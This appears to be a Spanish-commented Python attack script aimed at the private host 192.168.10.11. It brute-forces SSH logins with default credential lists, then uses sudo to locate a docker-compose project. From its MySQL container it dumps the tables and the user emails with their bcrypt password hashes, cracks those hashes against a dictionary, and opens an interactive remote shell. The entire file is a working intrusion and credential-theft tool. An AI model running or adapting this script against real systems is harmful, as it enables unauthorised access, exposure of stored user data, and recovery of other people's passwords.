#!/usr/bin/env python3
"""
SSH Probe - Versión Extendida
Configurado para 192.168.10.11
Extrae tablas, busca hashes y crackea contraseñas.
"""
import sys
import time
import paramiko
import os
import bcrypt  # ⬅ Librería para romper los hashes

# --- Corrección para Windows ---
if os.name == 'nt':
    import msvcrt
else:
    import select

# ---------- CONFIG ----------
HOST_DEFAULT = "192.168.10.11"     # ⬅ IP Objetivo
TIMEOUT = 6
DELAY_ENTRE_INTENTOS = 1.5
LOG_FILE = "probe.log"

USERS_DEFAULT = ["admin", "root", "ubuntu", "test", "user"]
PASSWORDS_DEFAULT = ["admin", "1234", "123456", "password", "root", "toor"]

def log(msg):
    print(msg)
    try:
        with open(LOG_FILE, "a", encoding="utf-8") as f:
            f.write(msg + "\n")
    except Exception:
        pass

def pedir_datos():
    host = sys.argv[1] if len(sys.argv) >= 2 else HOST_DEFAULT
    if len(sys.argv) == 4:
        with open(sys.argv[2]) as f:
            users = [x.strip() for x in f if x.strip()]
        with open(sys.argv[3]) as f:
            pws = [x.strip() for x in f if x.strip()]
    else:
        print(f"[i] Usando listas por defecto contra {host} (incluye admin/admin).")
        users = USERS_DEFAULT
        pws = PASSWORDS_DEFAULT
    return host, users, pws

def probar(host, user, password):
    cli = paramiko.SSHClient()
    cli.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        cli.connect(
            hostname=host, username=user, password=password,
            timeout=TIMEOUT, banner_timeout=TIMEOUT, auth_timeout=TIMEOUT,
            allow_agent=False, look_for_keys=False,
        )
        return cli
    except paramiko.AuthenticationException:
        return None
    except Exception as e:
        log(f"   [!] error de red con {user}:{password} -> {e}")
        return None

def buscar_carpeta_docker(cli, user, password):
    log("[*] Buscando la carpeta de Docker en el servidor...")
    cmd_buscar = "sudo -S find / -name 'docker-compose.y*ml' -not -path '*/proc/*' -not -path '*/sys/*' 2>/dev/null | head -n 1"
    stdin, stdout, stderr = cli.exec_command(cmd_buscar)
    stdin.write(password + "\n")
    stdin.flush()
    resultado = stdout.read().decode(errors="ignore").strip()
    if not resultado:
        log("[-] No se encontró el archivo docker-compose.yml en el servidor.")
        return None
    carpeta = os.path.dirname(resultado)
    log(f"[+] Carpeta encontrada: {carpeta}")
    return carpeta

def ejecutar_consultas(cli, user, password, carpeta):
    log(f"\n[*] Ejecutando consultas en la base de datos desde {carpeta}...")
    
    ruta = f"cd {carpeta} && " if carpeta else ""
    
    comando_tablas = f"{ruta}sudo -S docker compose exec mysql sh -c 'mysql -u\"$MYSQL_USER\" -p\"$MYSQL_PASSWORD\" \"$MYSQL_DATABASE\" -e \"SHOW TABLES;\"'"
    comando_usuarios = f"{ruta}sudo -S docker compose exec mysql sh -c 'mysql -u\"$MYSQL_USER\" -p\"$MYSQL_PASSWORD\" \"$MYSQL_DATABASE\" -e \"SELECT * FROM usuarios;\"'"
    
    for nombre, cmd in [("TABLAS", comando_tablas), ("DATOS DE USUARIOS", comando_usuarios)]:
        log(f"\n--- {nombre} ---")
        stdin, stdout, stderr = cli.exec_command(cmd)
        stdin.write(password + "\n")
        stdin.flush()
        
        while True:
            linea = stdout.readline()
            if not linea:
                break
            print(linea, end="")
            
        err = stderr.read().decode(errors="ignore")
        err_limpio = err.replace(f"[sudo] password for {user}:", "").strip()
        if "Using a password on the command line interface can be insecure" in err_limpio:
            pass
        elif err_limpio:
            print(f"[!] Error: {err_limpio}")
            
    log("\n---------------------------\n")

def extraer_y_crackear(cli, user, password, carpeta, diccionario):
    log("[*] Extrayendo hashes de la base de datos...")
    
    ruta = f"cd {carpeta} && " if carpeta else ""
    comando = f"{ruta}sudo -S docker compose exec -T mysql sh -c 'mysql -B -N -u\"$MYSQL_USER\" -p\"$MYSQL_PASSWORD\" \"$MYSQL_DATABASE\" -e \"SELECT correo, contrasena_hash FROM usuarios;\"'"
    
    stdin, stdout, stderr = cli.exec_command(comando)
    stdin.write(password + "\n")
    stdin.flush()
    
    salida = stdout.read().decode(errors="ignore").strip()
    
    hashes = []
    for linea in salida.splitlines():
        if "\t" in linea:
            partes = linea.split("\t")
            if len(partes) >= 2:
                hashes.append((partes[0], partes[1]))
                
    if not hashes:
        log("[-] No se pudieron extraer hashes para crackear.")
        return
        
    log(f"[+] Se extrajeron {len(hashes)} hashes.\n")
    log("[*] Iniciando crackeo de hashes (esto puede tardar)...")
    
    for correo, hash_str in hashes:
        hash_bytes = hash_str.encode('utf-8')
        encontrada = False
        
        for pwd in diccionario:
            pwd_bytes = pwd.encode('utf-8')
            try:
                if bcrypt.checkpw(pwd_bytes, hash_bytes):
                    log(f"[🔥] ¡ENCONTRADA! Usuario: {correo} | Password: {pwd}")
                    encontrada = True
                    break
            except ValueError:
                pass
                
        if not encontrada:
            log(f"[-] No encontrada para: {correo}")

def shell_interactiva(cli, user, host):
    log(f"\n[+] Conectado como '{user}' a {host}")
    log("[i] Ya podés trabajar. Escribí 'exit' para cerrar la sesión.\n")

    chan = cli.invoke_shell()
    chan.settimeout(0.0)

    try:
        while True:
            if chan.recv_ready():
                sys.stdout.write(chan.recv(4096).decode(errors="ignore"))
                sys.stdout.flush()

            if os.name == 'nt':
                if msvcrt.kbhit():
                    char = msvcrt.getch()
                    chan.send(char)
                    if char == b'\r':
                        chan.send(b'\n')
            else:
                r, _, _ = select.select([sys.stdin], [], [], 0.1)
                if r:
                    linea = sys.stdin.readline()
                    if not linea:
                        break
                    chan.send(linea)

            if not chan.active:
                break

    except KeyboardInterrupt:
        pass
    finally:
        cli.close()
        log("\n[*] Sesión cerrada.")

def main():
    log(f"\n===== SSH Probe iniciado {time.strftime('%Y-%m-%d %H:%M:%S')} =====")
    host, users, pws = pedir_datos()
    total = len(users) * len(pws)
    intento = 0
    encontrado = None

    log(f"\n[*] Probando {total} combinaciones contra {host}...\n")

    for user in users:
        for pwd in pws:
            intento += 1
            print(f"[{intento}/{total}] Probando {user}:{pwd}", end=" ... ", flush=True)
            cli = probar(host, user, pwd)
            if cli:
                print("OK ✅")
                log(f"[+] VÁLIDO: {user}:{pwd}")
                encontrado = (cli, user, pwd)
                break
            else:
                print("no")
            time.sleep(DELAY_ENTRE_INTENTOS)
        if encontrado:
            break

    if not encontrado:
        log("\n[-] No hubo credenciales válidas.")
        input("Presioná ENTER para salir...")
        return

    cli, user, pwd = encontrado
    carpeta = buscar_carpeta_docker(cli, user, pwd)
    
    if carpeta:
        # 1. Mostramos las tablas (lo que te gustaba ver)
        ejecutar_consultas(cli, user, pwd, carpeta)
        
        # 2. Extraemos y crackeamos
        diccionario = pws
        if len(sys.argv) == 4:
             with open(sys.argv[3]) as f:
                diccionario = [x.strip() for x in f if x.strip()]
                
        extraer_y_crackear(cli, user, pwd, carpeta, diccionario)
    else:
        log("[-] Saltando consultas de MySQL.")

    shell_interactiva(cli, user, host)
    input("\nPresioná ENTER para salir del programa...")

if __name__ == "__main__":
    main()